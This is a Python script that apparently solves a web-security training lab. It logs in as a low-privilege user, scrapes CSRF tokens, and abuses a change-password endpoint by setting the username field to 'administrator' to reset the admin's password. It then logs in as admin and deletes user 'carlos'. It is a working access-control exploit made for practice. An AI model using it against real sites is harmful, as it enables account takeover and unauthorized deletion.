import requests
import re




# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

# To find the csrf token from url 

csrf_token = session.get(app_url+"/login",verify=False,proxies=proxies)
match  = re.search(r'name="csrf" value="(.*?)"',csrf_token.text)  # find the csrf token
token = match.group(1)
print(f"this is csrf",token)


data_wiener_login = {"username":"wiener","password":"peter","csrf":token}
wiener_session = session.post(app_url+"/login",data=data_wiener_login,verify=False,proxies=proxies)

csrf_token1 = session.get(app_url+"/my-account?id=wiener",verify=False,proxies=proxies)
match1  = re.search(r'name="csrf" value="(.*?)"',csrf_token1.text)  # find the csrf token
token1 = match1.group(1)
print(f"this is csrf of weiner ",token1)



data = {"csrf":token1,"username":"administrator","new-password-1":"test","new-password-2":"test"}
administrator_session = session.post(app_url+"/my-account/change-password",data=data,proxies=proxies,verify=False)

admin_session = requests.Session()

admin_csrf_token = admin_session.get(app_url+"/login",verify=False,proxies=proxies)
admin_match  = re.search(r'name="csrf" value="(.*?)"',admin_csrf_token.text)  # find the csrf token
admin_token = admin_match.group(1)
print(f"this is admin csrf",admin_token)

admin_session_data = {"username":"administrator","password":"test","csrf":admin_token}
admin_login = admin_session.post(app_url+"/login",verify=False,proxies=proxies,data=admin_session_data)
delete_carlos = admin_session.get(app_url+"/admin/delete?username=carlos",verify=False,proxies=proxies)
